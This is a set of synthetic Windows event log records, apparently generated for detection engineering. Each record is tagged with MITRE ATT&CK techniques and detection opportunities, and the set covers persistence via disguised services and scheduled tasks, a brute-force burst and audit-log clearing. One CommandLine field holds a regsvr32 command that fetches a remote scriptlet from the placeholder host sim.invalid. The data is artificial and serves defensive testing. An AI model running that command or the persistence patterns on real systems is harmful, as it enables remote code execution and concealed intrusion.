{"artifact_id": "1fddb4bc-9192-4a0a-951d-7ccd13b422b7", "session_id": "e7b0ea99-16ec-4f5d-85d8-6135ec5dc86f", "timestamp": "2026-06-26T00:50:27.439036+00:00", "layer": "windows_event_log_sim", "phase": "SIMULATE", "event_id_sim": 4688, "windows_event_id": 4688, "EventID": 4688, "Channel": "Security", "channel_sim": "Security", "Provider_Name": "Microsoft-Windows-Security-Auditing", "provider_sim": "Microsoft-Windows-Security-Auditing", "Computer": "SQLSERVER-SIM", "computer_sim": "SQLSERVER-SIM", "simulation_only": true, "executable": false, "payload_present": false, "safety": {"simulation_only": true, "executable": false, "payload_present": false, "portable_adversarial_procedure": false, "network_connection": false, "subprocess_spawned": false, "real_file_written": false, "shell_invoked": false}, "generator": "shenron/windows_event_log_sim v0.4.1", "note": "SYNTHETIC RECORD \u2014 Windows Event Log shape simulation only", "mitre_techniques": ["T1059", "T1059.001"], "behavior_class": "process_creation_sim", "detection_opportunities": ["process_create_non_system_parent", "commandline_encoded_b64", "interpreter_spawn_suspicious_parent"], "Image": "C:\\Windows\\System32\\svchost.exe", "exe_sim": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "wscript.exe //B //NoLogo sim_script.js", "command_sim": "wscript.exe //B //NoLogo sim_script.js", "ParentImage": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe", "parent_layer_sim": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe", "SubjectUserName": "SYSTEM", "user_sim": "NT AUTHORITY\\SYSTEM", "ProcessId": "16090", "target_pid_sim": "16090", "description": "Process creation: svchost.exe via powershell.exe"}
{"artifact_id": "6a53d2a4-8888-4ebe-823d-5ee93ac550e8", "session_id": "e7b0ea99-16ec-4f5d-85d8-6135ec5dc86f", "timestamp": "2026-06-26T00:50:27.439280+00:00", "layer": "windows_event_log_sim", "phase": "SIMULATE", "event_id_sim": 4698, "windows_event_id": 4698, "EventID": 4698, "Channel": "Security", "channel_sim": "Security", "Provider_Name": "Microsoft-Windows-Security-Auditing", "provider_sim": "Microsoft-Windows-Security-Auditing", "Computer": "DC01-SIM", "computer_sim": "DC01-SIM", "simulation_only": true, "executable": false, "payload_present": false, "safety": {"simulation_only": true, "executable": false, "payload_present": false, "portable_adversarial_procedure": false, "network_connection": false, "subprocess_spawned": false, "real_file_written": false, "shell_invoked": false}, "generator": "shenron/windows_event_log_sim v0.4.1", "note": "SYNTHETIC RECORD \u2014 Windows Event Log shape simulation only", "mitre_techniques": ["T1053", "T1053.005"], "behavior_class": "scheduled_task_creation_sim", "detection_opportunities": ["scheduled_task_created_non_admin_tool", "task_action_references_temp_path", "scheduled_task_created_suspicious_user"], "TaskName": "\\WindowsUpdate_beacon_sim", "task_name_sim": "\\WindowsUpdate_beacon_sim", "SubjectUserName": "svc_account", "user_sim": "DOMAIN_SIM\\svc_account", "Image": "C:\\Windows\\System32\\cmd.exe", "exe_sim": "C:\\Windows\\System32\\cmd.exe", "description": "Scheduled task created: \\WindowsUpdate_beacon_sim by DOMAIN_SIM\\svc_account"}
{"artifact_id": "4e4a0318-5376-4a64-a48d-fc8c501f7acb", "session_id": "e7b0ea99-16ec-4f5d-85d8-6135ec5dc86f", "timestamp": "2026-06-26T00:50:27.439457+00:00", "layer": "windows_event_log_sim", "phase": "SIMULATE", "event_id_sim": 4697, "windows_event_id": 4697, "EventID": 4697, "Channel": "Security", "channel_sim": "Security", "Provider_Name": "Microsoft-Windows-Security-Auditing", "provider_sim": "Microsoft-Windows-Security-Auditing", "Computer": "FILESERVER01-SIM", "computer_sim": "FILESERVER01-SIM", "simulation_only": true, "executable": false, "payload_present": false, "safety": {"simulation_only": true, "executable": false, "payload_present": false, "portable_adversarial_procedure": false, "network_connection": false, "subprocess_spawned": false, "real_file_written": false, "shell_invoked": false}, "generator": "shenron/windows_event_log_sim v0.4.1", "note": "SYNTHETIC RECORD \u2014 Windows Event Log shape simulation only", "mitre_techniques": ["T1543", "T1543.003"], "behavior_class": "service_installed_sim", "detection_opportunities": ["service_created_non_installer", "service_binary_in_temp_path", "service_account_suspicious"], "ServiceName": "WindowsUpdateSvc_SIM", "service_name_sim": "WindowsUpdateSvc_SIM", "ServiceFileName": "C:\\Windows\\Temp\\WindowsUpdateSvc_SIM.exe", "service_path_sim": "C:\\Windows\\Temp\\WindowsUpdateSvc_SIM.exe", "SubjectUserName": "SYSTEM", "user_sim": "NT AUTHORITY\\SYSTEM", "description": "Service installed: WindowsUpdateSvc_SIM -> C:\\Windows\\Temp\\WindowsUpdateSvc_SIM.exe"}
{"artifact_id": "0f67d40f-df0e-421a-85d3-7f4d6783da19", "session_id": "e7b0ea99-16ec-4f5d-85d8-6135ec5dc86f", "timestamp": "2026-06-26T00:50:27.439614+00:00", "layer": "windows_event_log_sim", "phase": "SIMULATE", "event_id_sim": 4698, "windows_event_id": 4698, "EventID": 4698, "Channel": "Security", "channel_sim": "Security", "Provider_Name": "Microsoft-Windows-Security-Auditing", "provider_sim": "Microsoft-Windows-Security-Auditing", "Computer": "SQLSERVER-SIM", "computer_sim": "SQLSERVER-SIM", "simulation_only": true, "executable": false, "payload_present": false, "safety": {"simulation_only": true, "executable": false, "payload_present": false, "portable_adversarial_procedure": false, "network_connection": false, "subprocess_spawned": false, "real_file_written": false, "shell_invoked": false}, "generator": "shenron/windows_event_log_sim v0.4.1", "note": "SYNTHETIC RECORD \u2014 Windows Event Log shape simulation only", "mitre_techniques": ["T1053", "T1053.005"], "behavior_class": "scheduled_task_creation_sim", "detection_opportunities": ["scheduled_task_created_non_admin_tool", "task_action_references_temp_path", "scheduled_task_created_suspicious_user"], "TaskName": "\\svchost_persist_sim", "task_name_sim": "\\svchost_persist_sim", "SubjectUserName": "svc_account", "user_sim": "DOMAIN_SIM\\svc_account", "Image": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe", "exe_sim": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe", "description": "Scheduled task created: \\svchost_persist_sim by DOMAIN_SIM\\svc_account"}
{"artifact_id": "39742030-79d0-4b52-abc8-429cc01d7c92", "session_id": "e7b0ea99-16ec-4f5d-85d8-6135ec5dc86f", "timestamp": "2026-06-26T00:50:27.439770+00:00", "layer": "windows_event_log_sim", "phase": "SIMULATE", "event_id_sim": 4688, "windows_event_id": 4688, "EventID": 4688, "Channel": "Security", "channel_sim": "Security", "Provider_Name": "Microsoft-Windows-Security-Auditing", "provider_sim": "Microsoft-Windows-Security-Auditing", "Computer": "DC01-SIM", "computer_sim": "DC01-SIM", "simulation_only": true, "executable": false, "payload_present": false, "safety": {"simulation_only": true, "executable": false, "payload_present": false, "portable_adversarial_procedure": false, "network_connection": false, "subprocess_spawned": false, "real_file_written": false, "shell_invoked": false}, "generator": "shenron/windows_event_log_sim v0.4.1", "note": "SYNTHETIC RECORD \u2014 Windows Event Log shape simulation only", "mitre_techniques": ["T1059", "T1059.001"], "behavior_class": "process_creation_sim", "detection_opportunities": ["process_create_non_system_parent", "commandline_encoded_b64", "interpreter_spawn_suspicious_parent"], "Image": "C:\\Windows\\System32\\cscript.exe", "exe_sim": "C:\\Windows\\System32\\cscript.exe", "CommandLine": "regsvr32.exe /s /n /u /i:http://sim.invalid/file.sct_SIM scrobj.dll", "command_sim": "regsvr32.exe /s /n /u /i:http://sim.invalid/file.sct_SIM scrobj.dll", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "parent_layer_sim": "C:\\Windows\\System32\\svchost.exe", "SubjectUserName": "user01", "user_sim": "DOMAIN_SIM\\user01", "ProcessId": "10979", "target_pid_sim": "10979", "description": "Process creation: cscript.exe via svchost.exe"}
{"artifact_id": "9718710a-b0b2-4e38-879a-56eaa4455218", "session_id": "e7b0ea99-16ec-4f5d-85d8-6135ec5dc86f", "timestamp": "2026-06-26T00:50:27.439919+00:00", "layer": "windows_event_log_sim", "phase": "SIMULATE", "event_id_sim": 4625, "windows_event_id": 4625, "EventID": 4625, "Channel": "Security", "channel_sim": "Security", "Provider_Name": "Microsoft-Windows-Security-Auditing", "provider_sim": "Microsoft-Windows-Security-Auditing", "Computer": "SQLSERVER-SIM", "computer_sim": "SQLSERVER-SIM", "simulation_only": true, "executable": false, "payload_present": false, "safety": {"simulation_only": true, "executable": false, "payload_present": false, "portable_adversarial_procedure": false, "network_connection": false, "subprocess_spawned": false, "real_file_written": false, "shell_invoked": false}, "generator": "shenron/windows_event_log_sim v0.4.1", "note": "SYNTHETIC RECORD \u2014 Windows Event Log shape simulation only", "mitre_techniques": ["T1110", "T1110.001"], "behavior_class": "failed_logon_burst_sim", "detection_opportunities": ["multiple_failed_logons_single_source", "brute_force_pattern_sim"], "SubjectUserName": "svc_account", "user_sim": "DOMAIN_SIM\\svc_account", "SubjectDomainName": "DOMAIN_SIM", "domain_sim": "DOMAIN_SIM", "fail_count_sim": 39, "description": "Failed logon: DOMAIN_SIM\\svc_account (39 attempts simulated)"}
{"artifact_id": "e64335f9-ad47-4096-9eed-ab0eb477e599", "session_id": "e7b0ea99-16ec-4f5d-85d8-6135ec5dc86f", "timestamp": "2026-06-26T00:50:27.440080+00:00", "layer": "windows_event_log_sim", "phase": "SIMULATE", "event_id_sim": 1102, "windows_event_id": 1102, "EventID": 1102, "Channel": "Security", "channel_sim": "Security", "Provider_Name": "Microsoft-Windows-Eventlog", "provider_sim": "Microsoft-Windows-Eventlog", "Computer": "FILESERVER01-SIM", "computer_sim": "FILESERVER01-SIM", "simulation_only": true, "executable": false, "payload_present": false, "safety": {"simulation_only": true, "executable": false, "payload_present": false, "portable_adversarial_procedure": false, "network_connection": false, "subprocess_spawned": false, "real_file_written": false, "shell_invoked": false}, "generator": "shenron/windows_event_log_sim v0.4.1", "note": "SYNTHETIC RECORD \u2014 Windows Event Log shape simulation only", "mitre_techniques": ["T1070", "T1070.001"], "behavior_class": "audit_log_cleared_sim", "detection_opportunities": ["security_event_log_cleared", "indicator_removal_windows_sim"], "SubjectUserName": "Administrator", "user_sim": "DOMAIN_SIM\\Administrator", "description": "Security audit log cleared by DOMAIN_SIM\\Administrator on FILESERVER01-SIM"}
{"artifact_id": "4f92a74e-d8a0-406f-917f-7dfeec2af69a", "session_id": "e7b0ea99-16ec-4f5d-85d8-6135ec5dc86f", "timestamp": "2026-06-26T00:50:27.440225+00:00", "layer": "windows_event_log_sim", "phase": "SIMULATE", "event_id_sim": 7045, "windows_event_id": 7045, "EventID": 7045, "Channel": "System", "channel_sim": "System", "Provider_Name": "Service Control Manager", "provider_sim": "Service Control Manager", "Computer": "WORKSTATION-042-SIM", "computer_sim": "WORKSTATION-042-SIM", "simulation_only": true, "executable": false, "payload_present": false, "safety": {"simulation_only": true, "executable": false, "payload_present": false, "portable_adversarial_procedure": false, "network_connection": false, "subprocess_spawned": false, "real_file_written": false, "shell_invoked": false}, "generator": "shenron/windows_event_log_sim v0.4.1", "note": "SYNTHETIC RECORD \u2014 Windows Event Log shape simulation only", "mitre_techniques": ["T1543", "T1543.003"], "behavior_class": "new_service_system_log_sim", "detection_opportunities": ["new_service_installed_system_log", "service_binary_not_signed_sim"], "ServiceName": "RemoteAccessSIM", "service_name_sim": "RemoteAccessSIM", "ServiceFileName": "C:\\Windows\\System32\\wscript.exe", "service_path_sim": "C:\\Windows\\System32\\wscript.exe", "description": "New service installed (System): RemoteAccessSIM -> C:\\Windows\\System32\\wscript.exe"}
